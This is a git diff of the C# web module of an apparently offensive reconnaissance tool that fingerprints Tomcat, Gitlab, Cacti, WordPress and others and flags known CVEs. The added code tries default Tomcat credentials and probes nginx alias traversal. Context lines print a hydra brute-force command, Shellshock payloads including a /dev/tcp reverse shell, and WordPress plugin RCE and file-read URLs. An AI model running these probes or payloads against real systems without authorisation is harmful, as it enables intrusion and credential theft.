@@ -13,6 +13,7 @@ using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Text.Json;
+using System.Text.Json.Nodes;
 using System.Text.RegularExpressions;
 
 namespace Reecon
@@ -104,7 +105,7 @@ namespace Reecon
 
                         // Form title / actions
                         string formHeader = text.Substring(0, text.IndexOf(">"));
-                        if (formHeader.Replace(" ","").Contains("method=\""))
+                        if (formHeader.Replace(" ", "").Contains("method=\""))
                         {
                             string formMethod = formHeader.Remove(0, formHeader.IndexOf("method"));
                             formMethod = formMethod.Remove(0, formMethod.IndexOf("\"") + 1);
@@ -122,6 +123,7 @@ namespace Reecon
                         // Inputs
                         List<string> inputs = text.Split("<input").ToList();
                         inputs = inputs.Where(x => !x.StartsWith("<form")).ToList();
+                        inputs = inputs.Where(x => !x.Contains("\"hidden\"")).ToList(); // Some additional properties - Not related to what the user sees
                         string username = null;
                         string password = null;
                         foreach (string item in inputs)
@@ -156,12 +158,15 @@ namespace Reecon
                             }
                         }
 
-                        // <button's (Can be used instead of input for type="submit")
+                        // Submits
+                        List<string> submitButtons = text.Split("<button").ToList();
+                        submitButtons = submitButtons.Where(x => !x.StartsWith("<form")).ToList();
+                        submitButtons = submitButtons.Where(x => x.Contains("\"submit\"")).ToList();
 
                         // This will only work in the best of cases
-                        if (inputs.Count == 3 && username != null && password != null)
+                        if ((inputs.Count == 3 || (inputs.Count == 2 && submitButtons.Count == 1)) && username != null && password != null)
                         {
-                            returnText += "-- " + "Possible Form Found".Pastel(Color.Orange) + Environment.NewLine;
+                            returnText += "-- " + "Possible Login Form Found".Pastel(Color.Orange) + Environment.NewLine;
                             returnText += "--- " + $"hydra -l logins.txt -p passwords.txt 127.0.0.1 http-form-post \"/folder/post.php:{username}=^USER^&{password}=^PASS^:Invalid password error here\"".Pastel(Color.Orange) + Environment.NewLine;
                         }
                     }
@@ -281,6 +286,8 @@ namespace Reecon
             // Wildcard test
             int notFoundLength = -1;
             int notFoundLength2 = -1; // For times when the NotFound page contains the search text
+            int notFoundLengthPHP = -1;
+            int notFoundLengthPHP2 = -1;
             int ignoreFileLength = -1;
             int ignoreFolderLength = -1;
             // Currently google-able - Need to randomise
@@ -289,6 +296,8 @@ namespace Reecon
             bool ignoreRedirect = false;
             bool ignoreForbidden = false;
             bool ignoreBadRequest = false;
+            // Exploits
+            bool nginxAliasTraversalChecked = false;
 
             // Testing Wildcards
             var pageResult = Web.GetHTTPInfo(wildcardURL);
@@ -339,8 +348,8 @@ namespace Reecon
             }
             else if (pageResult.StatusCode == HttpStatusCode.NotFound)
             {
-                notFoundLength = pageResultText.Length;
-                notFoundLength2 = pageResultText.Replace("be0df04b-f5ff-4b4f-af99-00968cf08fed.php", "").Length;
+                notFoundLengthPHP = pageResultText.Length;
+                notFoundLengthPHP2 = pageResultText.Replace("be0df04b-f5ff-4b4f-af99-00968cf08fed.php", "").Length;
                 // returnText += "Using PHP NFL" + Environment.NewLine;
                 // returnText += "PHP NFL 1: " + notFoundLength + Environment.NewLine;
                 // returnText += "PHP NFL 2: " + notFoundLength2 + Environment.NewLine;
@@ -383,6 +392,7 @@ namespace Reecon
                 // Admin stuff
                 "admin.php",
                 "admin/",
+                "administrator/",
                 "manager/",
                 // Access details
                 ".htaccess",
@@ -429,7 +439,8 @@ namespace Reecon
                 "server-status",
                 "LICENSE",
                 "help",
-                "info"
+                "info",
+                "files/"
             };
 
             if (ignorePHP)
@@ -491,7 +502,7 @@ namespace Reecon
                                 // https://github.com/arthaud/git-dumper/issues/9
                                 try
                                 {
-                                    if (DownloadString($"{url}.git/").Contains("../"))
+                                    if (DownloadString($"{url}.git/").Text.Contains("../"))
                                     {
                                         // -q: Quiet (So the console doesn't get spammed)
                                         // -r: Download everything
@@ -521,7 +532,7 @@ namespace Reecon
                                 try
                                 {
                                     string toCheck = $"{url}{file}";
-                                    string pageData = DownloadString($"{url}{file}");
+                                    string pageData = DownloadString($"{url}{file}").Text;
                                     if (pageData.IndexOf("&quot;version&quot;:&quot;") != -1)
                                     {
                                         string versionText = pageData.Remove(0, pageData.IndexOf("&quot;version&quot;:&quot;") + 26);
@@ -552,19 +563,34 @@ namespace Reecon
                                 returnText += "--- // Test: curl -H 'User-Agent: () { :;}; echo; /bin/cat /etc/passwd;' http://1.2.3.4/cgi-bin/valid.cgi" + Environment.NewLine;
                                 // Shell: curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.6.2.249/9001 0>&1;" http://10.10.175.194/cgi-bin/valid.cgi"
                             }
+                            // Directory listing
+                            else if (response.PageTitle.StartsWith("Index of /"))
+                            {
+                                returnText += "-- " + "Open directory listing".Pastel(Color.Orange) + Environment.NewLine;
+
+                                // nginx Alias Traversal
+                                if (!nginxAliasTraversalChecked)
+                                {
+                                    if (response.Headers.Any(x => x.Key == "Server" && x.Value.Any(x => x.StartsWith("nginx"))))
+                                    {
+                                        string traversalPath = path.Remove(path.Length - 1, 1) + "../";
+                                        var traversalResponse = Web.GetHTTPInfo(traversalPath);
+                                        if (traversalResponse.PageTitle.Contains("Index of "))
+                                        {
+                                            returnText += "--- " + "nginx Alias Traversal!!!".Pastel(Color.Orange) + Environment.NewLine;
+                                            returnText += "--- " + traversalPath.Pastel(Color.Orange) + Environment.NewLine;
+                                        }
+                                    }
+                                    nginxAliasTraversalChecked = true;
+                                }
+                            }
+                            // Generic
                             else
                             {
-                                if (response.PageTitle.StartsWith("Index of /"))
+                                string usefulInfo = Web.FindInfo(pageText, true);
+                                if (usefulInfo.Trim(Environment.NewLine.ToCharArray()) != "")
                                 {
-                                    returnText += "-- " + "Open directory listing".Pastel(Color.Orange) + Environment.NewLine;
-                                }
-                                else
-                                {
-                                    string usefulInfo = Web.FindInfo(pageText, true);
-                                    if (usefulInfo.Trim(Environment.NewLine.ToCharArray()) != "")
-                                    {
-                                        returnText += usefulInfo + Environment.NewLine;
-                                    }
+                                    returnText += usefulInfo + Environment.NewLine;
                                 }
                             }
                         }
@@ -655,7 +681,7 @@ namespace Reecon
                     returnText += "-- Docker Detected - API Version: " + dockerVersion + Environment.NewLine;
                     if (dockerVersion == "registry/2.0")
                     {
-                        string repoText = DownloadString($"{url}v2/_catalog");
+                        string repoText = DownloadString($"{url}v2/_catalog").Text;
                         if (repoText.Contains("repositories"))
                         {
                             try
@@ -664,13 +690,13 @@ namespace Reecon
                                 foreach (var item in repoList.RootElement.GetProperty("repositories").EnumerateArray())
                                 {
                                     returnText += "--- Repo Found: " + item + Environment.NewLine;
-                                    string tagList = DownloadString($"{url}v2/" + item + "/tags/list");
+                                    string tagList = DownloadString($"{url}v2/" + item + "/tags/list").Text;
                                     tagList = tagList.Replace("\r", "").Replace("\n", ""); // Sometimes has a built in newline for some reason
                                     returnText += "---- Tags Found: " + tagList + Environment.NewLine;
+                                    returnText += $"------> {url}v2/{item}/manifests/tagNameHere (End of the above)";
                                     // /v2/cmnatic/myapp1/tags/list
                                     // --> /cmnatic/myapp1/manifests/notsecure
                                 }
-                                returnText += $"------> {url}v2/[repoName]/app/manifests/[tagName]";
                                 // Every notfound will be the same
                                 break;
                             }
@@ -693,6 +719,11 @@ namespace Reecon
                     response.PageText.Length != notFoundLength &&
                     response.PageText.Replace(file, "").Length != notFoundLength2)
                 {
+                    if (file.EndsWith(".php") && response.PageText.Length == notFoundLengthPHP ||
+                    response.PageText.Replace(file, "").Length == notFoundLengthPHP2)
+                    {
+                        continue;
+                    }
                     returnText += $"-- Maybe, Maybe Not: {url}{file}" + Environment.NewLine;
                     // returnText += "-- Page Len: " + response.PageText.Length + Environment.NewLine;
                     // returnText += "-- Page Len Repl: " + response.PageText.ToLower().Replace(file.ToLower(), "").Length + Environment.NewLine;
@@ -702,7 +733,7 @@ namespace Reecon
                 }
                 // Something else - Just print the response
                 else if (response.StatusCode != HttpStatusCode.NotFound &&
-                    response.StatusCode != HttpStatusCode.TooManyRequests && 
+                    response.StatusCode != HttpStatusCode.TooManyRequests &&
                     response.StatusCode != HttpStatusCode.ServiceUnavailable)
                 {
                     if (response.PageText != "")
@@ -781,7 +812,7 @@ namespace Reecon
                 else if (ex.Message.StartsWith("The request was canceled due to the configured HttpClient.Timeout of "))
                 {
                     // Why is this not caught in the TimeoutException...
-                    Console.WriteLine($"- TimeoutError - {url} timed out :(".Pastel(Color.Red));
+                    Console.WriteLine($"- Odd TimeoutError - {url} timed out: {ex.Message} - Bug Reelix".Pastel(Color.Red));
                     return (statusCode, null, null, null, null, null, url, "Timed Out :(");
                 }
                 else if (ex.InnerException != null && ex.InnerException.GetType().IsAssignableFrom(typeof(IOException)))
@@ -907,10 +938,11 @@ namespace Reecon
             {
                 PageTitle = PageTitle.Trim();
                 responseText += "- Page Title: " + PageTitle + Environment.NewLine;
-                
+
                 // Apache Tomcat
                 if (PageTitle.StartsWith("Apache Tomcat"))
                 {
+
                     // Sanitize URL
                     if (!URL.EndsWith("/"))
                     {
@@ -918,112 +950,75 @@ namespace Reecon
                     }
 
                     // CVE's
+                    // https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0232
+                    /*
+                        Apache Tomcat 9.0.0.M1 to 9.0.17
+                        Apache Tomcat 8.5.0 to 8.5.39
+                        Apache Tomcat 7.0.0 to 7.0.93
+                    */
                     if (PageTitle == "Apache Tomcat/9.0.17")
                     {
                         responseText += "- " + "Apache Tomcat 9.0.17 Detected - Vulnerable to CVE-2019-0232!".Pastel(Color.Orange);
                     }
 
                     // Apache Tomcat Page
-                    NetworkCredential defaultTomcatCreds = new("tomcat", "s3cret");
+                    List<NetworkCredential> defaultTomcatCreds =
+                    [
+                        new("tomcat", "s3cret"),
+                        new("tomcat", "tomcat"),
+                        new("manager", "manager"),
+                        new("manager", "tomcat"),
+                        new("admin", ""),
+                    ];
 
-                    // Check Manager (Status)
-                    string managerStatusURL = URL + "manager/status";
-                    var managerStatusInfo = Web.GetHTTPInfo(managerStatusURL);
-                    if (managerStatusInfo.StatusCode == HttpStatusCode.Unauthorized)
-                    {
-                        responseText += "- Manager (Status) Found - But it requires credentials --> " + managerStatusURL + Environment.NewLine;
-                        try
-                        {
-                            DownloadString(managerStatusURL, Creds: defaultTomcatCreds);
-                            responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
-                        }
-                        catch
-                        {
-                            responseText += "-- Default creds - tomcat:s3cret - don't work" + Environment.NewLine;
-                        }
-                    }
-                    else if (managerStatusInfo.StatusCode == HttpStatusCode.Forbidden)
-                    {
-                        responseText += "- Manager (Status) Found - But it's Forbidden" + Environment.NewLine;
-                    }
-                    else if (managerStatusInfo.StatusCode != HttpStatusCode.NotFound)
-                    {
-                        responseText += "Unknown Manager (Status) Code: " + managerStatusInfo.StatusCode + Environment.NewLine;
-                    }
+                    List<string> tomcatLoginPages = new List<string>();
+                    string managerStatusURL = URL + "manager/status"; // Manager (Status)
+                    tomcatLoginPages.Add(managerStatusURL);
+                    string managerAppHTMLURL = URL + "manager/html"; // Manager App (HTML)
+                    tomcatLoginPages.Add(managerAppHTMLURL);
+                    string managerAppTextURL = URL + "manager/text"; // Manager App (Text)
+                    tomcatLoginPages.Add(managerAppTextURL);
+                    string hostManagerURL = URL + "host-manager/html"; // Host Manager (HTML)
+                    tomcatLoginPages.Add(hostManagerURL);
 
-                    // Check Manager (HTML)
-                    string managerAppHTMLURL = URL + "manager/html";
-                    var managerAppInfo = Web.GetHTTPInfo(managerAppHTMLURL);
-                    if (managerAppInfo.StatusCode == HttpStatusCode.Unauthorized)
+                    foreach (string tomcatLoginPage in tomcatLoginPages)
                     {
-                        responseText += "- Manager App (HTML) Found - But it requires credentials --> " + managerAppHTMLURL + Environment.NewLine;
-                        try
+                        string friendlyName = "";
+                        var pageInfo = Web.GetHTTPInfo(tomcatLoginPage);
+                        if (pageInfo.StatusCode == HttpStatusCode.Unauthorized)
                         {
-                            DownloadString(managerAppHTMLURL, Creds: defaultTomcatCreds);
-                            responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
+                            responseText += "- Yadda Found - But it requires credentials --> " + tomcatLoginPage + Environment.NewLine;
+                            try
+                            {
+                                // NetworkCredential defaultTomcatCreds = new("tomcat", "s3cret");
+                                bool found = false;
+                                foreach (var creds in defaultTomcatCreds)
+                                {
+                                    if (DownloadString(tomcatLoginPage, Creds: creds).StatusCode != HttpStatusCode.Unauthorized)
+                                    {
+                                        found = true;
+                                        responseText += "-- " + $"Creds Found: {creds.UserName}:{creds.Password}".Pastel(Color.Orange) + Environment.NewLine;
+                                        break;
+                                    }
+                                }
+                                if (!found)
+                                {
+                                    responseText += "-- No Creds found - You can try more over at: /auxiliary/scanner/http/tomcat_mgr_login" + Environment.NewLine;
+                                }
+                            }
+                            catch
+                            {
+                                responseText += "-- Default creds - tomcat:s3cret - don't work" + Environment.NewLine;
+                            }
                         }
-                        catch
+                        else if (pageInfo.StatusCode == HttpStatusCode.Forbidden)
                         {
-                            responseText += "-- Default creds - tomcat:s3cret - don't work" + Environment.NewLine;
+                            responseText += "- Manager App Found - But it's Forbidden" + Environment.NewLine;
                         }
-                    }
-                    else if (managerAppInfo.StatusCode == HttpStatusCode.Forbidden)
-                    {
-                        responseText += "- Manager App Found - But it's Forbidden" + Environment.NewLine;
-                    }
-                    else if (managerAppInfo.StatusCode != HttpStatusCode.NotFound)
-                    {
-                        responseText += "Unknown Manager App Status Code: " + managerAppInfo.StatusCode + Environment.NewLine;
-                    }
-
-                    // Check Manager (Text)
-                    string managerAppTextURL = URL + "manager/text";
-                    managerAppInfo = Web.GetHTTPInfo(managerAppTextURL);
-                    if (managerAppInfo.StatusCode == HttpStatusCode.Unauthorized)
-                    {
-                        responseText += "- Manager App (Text) Found - But it requires credentials --> " + managerAppTextURL + Environment.NewLine;
-                        try
+                        else if (pageInfo.StatusCode != HttpStatusCode.NotFound)
                         {
-                            DownloadString(managerAppTextURL, Creds: defaultTomcatCreds);
-                            responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
+                            responseText += "Unknown Manager App Status Code: " + pageInfo.StatusCode + Environment.NewLine;
                         }
-                        catch
-                        {
-                            responseText += "-- Default creds - tomcat:s3cret - don't work" + Environment.NewLine;
-                        }
-                    }
-                    else if (managerAppInfo.StatusCode == HttpStatusCode.Forbidden)
-                    {
-                        responseText += "- Manager App Found - But it's Forbidden" + Environment.NewLine;
-                    }
-                    else if (managerAppInfo.StatusCode != HttpStatusCode.NotFound)
-                    {
-                        responseText += "Unknown Manager App Status Code: " + managerAppInfo.StatusCode + Environment.NewLine;
-                    }
-
-                    // Check Host Manager
-                    string hostManagerURL = URL + "host-manager/html";
-                    var hostManagerInfo = Web.GetHTTPInfo(hostManagerURL);
-                    if (hostManagerInfo.StatusCode == HttpStatusCode.Unauthorized)
-                    {
-                        responseText += "- Host Manager Found - But it requires credentials --> " + hostManagerURL + Environment.NewLine;
-                        try
-                        {
-                            DownloadString(hostManagerURL, Creds: defaultTomcatCreds);
-                            responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
-                        }
-                        catch
-                        {
-                            responseText += "-- Default creds - tomcat:s3cret - don't work" + Environment.NewLine;
-                        }
-                    }
-                    else if (hostManagerInfo.StatusCode == HttpStatusCode.Forbidden)
-                    {
-                        responseText += "- Host Manager Found - But it's Forbidden" + Environment.NewLine;
-                    }
-                    else if (hostManagerInfo.StatusCode != HttpStatusCode.NotFound)
-                    {
-                        responseText += "Unknown Host Manager Status Code: " + hostManagerInfo.StatusCode + Environment.NewLine;
                     }
                 }
             }
@@ -1142,6 +1137,8 @@ namespace Reecon
                         responseText += "-- Drupal Detected" + Environment.NewLine;
                         // TODO: Do these in-code
                         responseText += $"-- Possible Version Detection: curl -s {baseURL}/CHANGELOG.txt | grep -m2 \"\"" + Environment.NewLine;
+                        // Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1
+                        // Drupalgeddon - https://nvd.nist.gov/vuln/detail/cve-2018-7600
                         responseText += $"-- Possible Version Detection 2: curl -s {baseURL}/ grep 'content=\"Drupal'" + Environment.NewLine;
                         responseText += $"-- Content Discovery: {baseURL}/node/1 (2,3,4,etc.)" + Environment.NewLine;
                         responseText += $"--- Run: droopescan scan drupal -u {baseURL}/ (pipx install droopescan)" + Environment.NewLine;
@@ -1203,6 +1200,22 @@ namespace Reecon
                     }
                 }
 
+                // Gitlab
+                if (Headers.Any(x => x.Key == "X-Gitlab-Meta"))
+                {
+                    responseText += "-- " + "Gitlab Detected".Pastel(Color.Orange) + Environment.NewLine;
+                    var versionCheck = GetHTTPInfo($"{URL}assets/webpack/manifest.json");
+                    if (versionCheck.StatusCode == HttpStatusCode.OK)
+                    {
+                        JsonDocument versionData = JsonDocument.Parse(versionCheck.PageText);
+                        string hash = versionData.RootElement.GetProperty("hash").GetString();
+                        responseText += "-- " + $"Version Hash: {hash}".Pastel(Color.Orange) + Environment.NewLine;
+                        responseText += "-- " + "Search in: https://raw.githubusercontent.com/righel/gitlab-version-nse/main/gitlab_hashes.json".Pastel(Color.Orange) + Environment.NewLine;
+                        responseText += "--- " + "CVE-2021-22205: 11.9.0 to 13.8.7, 13.9.0 to 13.9.5, 13.10.0 to 13.10.2 (Inclusive)".Pastel(Color.Orange) + Environment.NewLine;
+                        responseText += "--- " + "CVE-2023-7028: 16.1 to 16.1.5, 16.2 to 16.2.8, 16.3 to 16.3.6, 16.4 to 16.4.4, 16.5 to 16.5.5, 16.6 to 16.6.3, 16.7 to 16.7.1 (Inclusive)".Pastel(Color.Orange) + Environment.NewLine;
+                    }
+                }
+
                 // Kubernetes
                 if (Headers.Any(x => x.Key.StartsWith("X-Kubernetes-")))
                 {
@@ -1210,7 +1223,7 @@ namespace Reecon
                     var versionCheck = GetHTTPInfo($"{URL}version");
                     if (versionCheck.StatusCode == HttpStatusCode.OK)
                     {
-                        var versionData = JsonDocument.Parse(versionCheck.PageText);
+                        JsonDocument versionData = JsonDocument.Parse(versionCheck.PageText);
                         string major = versionData.RootElement.GetProperty("major").GetString();
                         string minor = versionData.RootElement.GetProperty("minor").GetString();
                         responseText += "-- " + $"Version: {major}.{minor} (In /version)".Pastel(Color.Orange) + Environment.NewLine;
@@ -1278,8 +1291,21 @@ namespace Reecon
                     string setCookie = Headers.GetValues("Set-Cookie").First();
                     Headers.Remove("Set-Cookie");
                     responseText += "- Set-Cookie: " + setCookie + Environment.NewLine;
+                    // Cacti
+                    if (setCookie.StartsWith("Cacti"))
+                    {
+                        responseText += "- " + "Cacti detected".Pastel(Color.Orange) + Environment.NewLine;
+                        if (PageText.Contains("Version 1.2.22"))
+                        {
+                            responseText += "-- " + "Vulnerable version 1.2.22 detected - CVE-2022-46169" + Environment.NewLine; ;
+                        }
+                        else
+                        {
+                            responseText += "-- Unknown Cacti version - Bug Reelix" + Environment.NewLine;
+                        }
+                    }
                     // CuteNews Cookie
-                    if (setCookie.StartsWith("CUTENEWS_SESSION"))
+                    else if (setCookie.StartsWith("CUTENEWS_SESSION"))
                     {
                         responseText += "-- " + $"CuteNews Found".Pastel(Color.Orange) + Environment.NewLine;
                         responseText += $"--- " + $"Browse to {urlWithSlash}CuteNews/index.php".Pastel(Color.Orange) + Environment.NewLine;
@@ -1365,7 +1391,7 @@ namespace Reecon
                 {
                     responseText += "- " + "Confluence detected!".Pastel(Color.Orange) + Environment.NewLine;
                     responseText += "-- " + "See if you can access /setup/".Pastel(Color.Orange) + Environment.NewLine; // Maybe automate this?
-                    // Get the version
+                                                                                                                        // Get the version
                     string confluenceVersionText = "";
                     if (PageText.Contains("Printed by Atlassian Confluence "))
                     {
@@ -1501,7 +1527,7 @@ namespace Reecon
                 if (PageText.Contains("Powered by Gitea"))
                 {
                     responseText += "- " + "Gitea detected!".Pastel(Color.Orange) + Environment.NewLine;
-                    if (PageText.ToLower().Contains("appver: '") && PageText.ToLower().Contains("appsuburl: '"))
+                    if (PageText.ToLower().Contains("appver: '") && PageText.ToLower().Contains("appsuburl: '")) // appUrl
                     {
                         string giteaVersion = PageText.Remove(0, PageText.ToLower().IndexOf("appver: '".ToLower()) + 9);
                         giteaVersion = giteaVersion.Substring(0, giteaVersion.IndexOf("'"));
@@ -1616,33 +1642,45 @@ namespace Reecon
                     }
 
                     // Basic vulnerable addons
+                    if (PageText.Contains("/wp-content/plugins/"))
+                    {
+                        /*
+                        List<string> pluginList = PageText.Split("/wp-content/plugins/".ToCharArray()).ToList();
+                        foreach (string plugin in pluginList)
+                        {
+                            string thePlugin = plugin.Substring(0, plugin.IndexOf("/wp-content/"));
+                            thePlugin = thePlugin.Substring(0, thePlugin.IndexOf(" ") - 1);
+                            Console.WriteLine("-- Found Plugin: " + thePlugin);
+                        }
+                        */
+                    }
                     if (PageText.Contains("/wp-with-spritz/"))
                     {
-                        responseText += "-- " + "Vulnerable Plugin Detected".Pastel(Color.Orange) + $" - {baseURL}/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
+                        responseText += "-- " + "Vulnerable Plugin Detected".Pastel(Color.Orange) + $" - {urlWithSlash}wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
                     }
                     else if (PageText.Contains("/wp-content/plugins/social-warfare"))
                     {
-                        responseText += "-- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Pastel(Color.Orange) + $" - {baseURL}/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
+                        responseText += "-- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Pastel(Color.Orange) + $" - {urlWithSlash}wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
                         responseText += "--- rce.txt: <pre>system('cat /etc/passwd')</pre>" + Environment.NewLine;
-                        responseText += $"--- Verify Version: {baseURL}/wordpress/wp-content/plugins/social-warfare/readme.txt - Scroll down to Changelog" + Environment.NewLine;
+                        responseText += $"--- Verify Version: {urlWithSlash}wp-content/plugins/social-warfare/readme.txt - Scroll down to Changelog" + Environment.NewLine;
                     }
 
                     // Check for public folders
-                    var contentDir = Web.GetHTTPInfo($"{baseURL}/wp-content/");
+                    var contentDir = Web.GetHTTPInfo($"{urlWithSlash}wp-content/");
                     if (contentDir.StatusCode == HttpStatusCode.OK && contentDir.PageText.Length != 0)
                     {
-                        responseText += "-- " + $"{baseURL}/wp-content/ is public".Pastel(Color.Orange) + Environment.NewLine;
+                        responseText += "-- " + $"{urlWithSlash}wp-content/ is public".Pastel(Color.Orange) + Environment.NewLine;
                     }
-                    var pluginsDir = Web.GetHTTPInfo($"{baseURL}/wp-content/plugins/");
+                    var pluginsDir = Web.GetHTTPInfo($"{urlWithSlash}wp-content/plugins/");
                     if (pluginsDir.StatusCode == HttpStatusCode.OK && pluginsDir.PageText.Length != 0)
                     {
-                        responseText += "-- " + $"{baseURL}/wp-content/plugins/ is public".Pastel(Color.Orange) + Environment.NewLine;
+                        responseText += "-- " + $"{urlWithSlash}wp-content/plugins/ is public".Pastel(Color.Orange) + Environment.NewLine;
                     }
 
-                    responseText += $"-- User Enumeration: wpscan --url {baseURL}/ --enumerate u1-5" + Environment.NewLine;
-                    responseText += $"-- Plugin Enumeration: wpscan --url {baseURL}/ --enumerate p" + Environment.NewLine;
-                    responseText += $"-- User + Plugin Enumeration: wpscan --url {baseURL}/ --enumerate u1-5,p" + Environment.NewLine;
-                    responseText += $"-- Aggressive Plugin Enumeration (Slow): wpscan --url {baseURL}/ --plugins-detection aggressive" + Environment.NewLine;
+                    responseText += $"-- User Enumeration: wpscan --url {urlWithSlash} --enumerate u1-5" + Environment.NewLine;
+                    responseText += $"-- Plugin Enumeration: wpscan --url {urlWithSlash} --enumerate p" + Environment.NewLine;
+                    responseText += $"-- User + Plugin Enumeration: wpscan --url {urlWithSlash} --enumerate u1-5,p" + Environment.NewLine;
+                    responseText += $"-- Aggressive Plugin Enumeration (Slow): wpscan --url {urlWithSlash} --plugins-detection aggressive" + Environment.NewLine;
 
                     // Checking for wp-login.php
                     var wplogin = GetHTTPInfo($"{baseURL}/wp-login.php");
@@ -1658,7 +1696,7 @@ namespace Reecon
                     // wpDiscuz
                     // Can also be found by view-source of a specific page
                     // Maybe find the first post, and enumerate all wp* ?
-                    var wpdiscuz = GetHTTPInfo($"{baseURL}/wp-content/plugins/wpdiscuz/readme.txt");
+                    var wpdiscuz = GetHTTPInfo($"{urlWithSlash}wp-content/plugins/wpdiscuz/readme.txt");
                     if (wpdiscuz.StatusCode == HttpStatusCode.OK && wpdiscuz.PageText.Contains("wpDiscuz "))
                     {
                         responseText += "-- wpDiscuz detected - Bug Reelix to update this.".Pastel(Color.Orange) + Environment.NewLine;
@@ -1666,7 +1704,7 @@ namespace Reecon
                     }
 
                     // simple-backup (Vuln plugin)
-                    var wpSimpleBackup = GetHTTPInfo($"{baseURL}/wp-content/plugins/simple-backup/readme.txt");
+                    var wpSimpleBackup = GetHTTPInfo($"{urlWithSlash}wp-content/plugins/simple-backup/readme.txt");
                     if (wpSimpleBackup.StatusCode == HttpStatusCode.OK && wpSimpleBackup.PageText.Contains("Name: Simple Backup"))
                     {
                         responseText += "-- " + "Wordpress Plugin Simple Backup Detected - Bug Reelix to update this.".Pastel(Color.Orange) + Environment.NewLine;
@@ -1756,20 +1794,20 @@ namespace Reecon
         {
             try
             {
-                string theString = DownloadString($"https://{target}:{port}/", Method: HttpMethod.Head);
+                string theString = DownloadString($"https://{target}:{port}/", Method: HttpMethod.Head).Text;
                 return true;
             }
-            catch (Exception)
+            catch (Exception ex)
             {
                 // Nope
-                // Console.WriteLine("In nope with: " + ex.Message);
+                Console.WriteLine("In nope with: " + ex.Message);
                 // This sometimes reaches here on actual https sites - Need to investigate...
                 // Either a non-accessable HEAD request or an invalid SSL Cert (Doesn't my Web class handle that... ?)
                 return false;
             }
         }
 
-        public static string DownloadString(string url, HttpMethod Method = null, HttpContent PostContent = null, string Cookie = null, NetworkCredential Creds = null, string UserAgent = null)
+        public static (string Text, HttpStatusCode StatusCode) DownloadString(string url, HttpMethod Method = null, HttpContent PostContent = null, string Cookie = null, NetworkCredential Creds = null, string UserAgent = null)
         {
             // For invalid HTTPS Certs
             var handler = new HttpClientHandler()
@@ -1812,14 +1850,16 @@ namespace Reecon
                 request.Headers.Add("User-Agent", UserAgent);
             }
 
+            HttpStatusCode statusCode;
             using (HttpResponseMessage response = httpClient.Send(request))
             {
+                statusCode = response.StatusCode;
                 using (StreamReader readStream = new(response.Content.ReadAsStream()))
                 {
                     toReturn = readStream.ReadToEnd();
                 }
             }
-            return toReturn;
+            return (toReturn, statusCode);
         }
     }
 }
